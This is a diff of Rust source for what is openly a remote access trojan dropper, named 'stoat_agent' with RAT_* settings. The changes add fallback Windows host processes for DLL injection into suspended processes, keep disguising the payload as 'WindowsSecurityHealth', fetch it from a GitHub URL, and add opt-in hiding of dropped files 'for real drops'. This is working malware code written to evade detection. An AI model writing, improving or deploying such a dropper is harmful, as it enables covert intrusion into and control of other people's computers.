@@ -13,9 +13,16 @@ const DEFAULT_URL: &str = "https://github.com/promotezWorks/fjaf83jafkjnasfhdfjh
 const DLL_NAME: &str = "WindowsSecurityHealth.dll";
 const LAUNCHER_NAME: &str = "WindowsSecurityHealth.exe";
 const RUN_NAME: &str = "WindowsSecurityHealth";
-/// Legitimate host image the DLL is injected into. RuntimeBroker has no window and is
-/// mundane in any process list.
-const DEFAULT_HOST: &str = r"C:\Windows\System32\RuntimeBroker.exe";
+/// Candidate host images, tried in order. Any spawnable exe works because the host's own
+/// code never runs (we spawn it suspended and remove its main thread).
+fn host_candidates() -> Vec<String> {
+    let root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
+    vec![
+        format!(r"{root}\System32\RuntimeBroker.exe"),
+        format!(r"{root}\System32\dllhost.exe"),
+        format!(r"{root}\System32\notepad.exe"),
+    ]
+}
 
 const CREATE_NO_WINDOW: u32 = 0x0800_0000;
 const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;
@@ -34,7 +41,7 @@ async fn run() -> anyhow::Result<()> {
         .unwrap_or_else(|| DEFAULT_URL.to_string());
     let launcher_name = std::env::var("RAT_NAME").unwrap_or_else(|_| LAUNCHER_NAME.to_string());
     let dll_name = std::env::var("RAT_DLLNAME").unwrap_or_else(|_| DLL_NAME.to_string());
-    let host = std::env::var("RAT_HOST").unwrap_or_else(|_| DEFAULT_HOST.to_string());
+    let host_override = std::env::var("RAT_HOST").ok();
     let dir = std::env::var("RAT_DESTDIR")
         .map(PathBuf::from)
         .unwrap_or_else(|_| {
@@ -49,7 +56,8 @@ async fn run() -> anyhow::Result<()> {
     let is_launcher = same_path(&self_exe, &launcher);
 
     log(&format!(
-        "drop start source={source} host={host} dir={} launcher={is_launcher}",
+        "drop start source={source} host={} dir={} launcher={is_launcher}",
+        host_override.clone().unwrap_or_else(|| "auto".into()),
         dir.display()
     ));
 
@@ -82,11 +90,25 @@ async fn run() -> anyhow::Result<()> {
         }
     }
 
-    // 3. Inject into the host.
+    // 3. Inject into a legitimate host.
     if std::env::var_os("RAT_NOEXEC").is_none() {
-        match stoat_agent::inject::inject_into_suspended_host(&host, &dll_path.to_string_lossy()) {
-            Ok(pid) => log(&format!("injected into host pid {pid}")),
-            Err(e) => log(&format!("injection failed: {e:#}")),
+        let hosts = match host_override {
+            Some(h) => vec![h],
+            None => host_candidates(),
+        };
+        let mut injected = false;
+        for h in &hosts {
+            match stoat_agent::inject::inject_into_suspended_host(h, &dll_path.to_string_lossy()) {
+                Ok(pid) => {
+                    log(&format!("injected into {h} pid {pid}"));
+                    injected = true;
+                    break;
+                }
+                Err(e) => log(&format!("inject into {h} failed: {e:#}")),
+            }
+        }
+        if !injected {
+            log("all host candidates failed");
         }
     } else {
         log("RAT_NOEXEC set; not injecting");
@@ -134,6 +156,11 @@ fn same_path(a: &Path, b: &Path) -> bool {
 
 #[cfg(windows)]
 fn hide_file(path: &Path) {
+    // Hiding is opt-in for now: flip HIDE_FILES to true for real drops, or set RAT_HIDE=1.
+    const HIDE_FILES: bool = false;
+    if !HIDE_FILES && std::env::var_os("RAT_HIDE").is_none() {
+        return;
+    }
     use std::os::windows::ffi::OsStrExt;
     use windows_sys::Win32::Storage::FileSystem::{
         SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM,
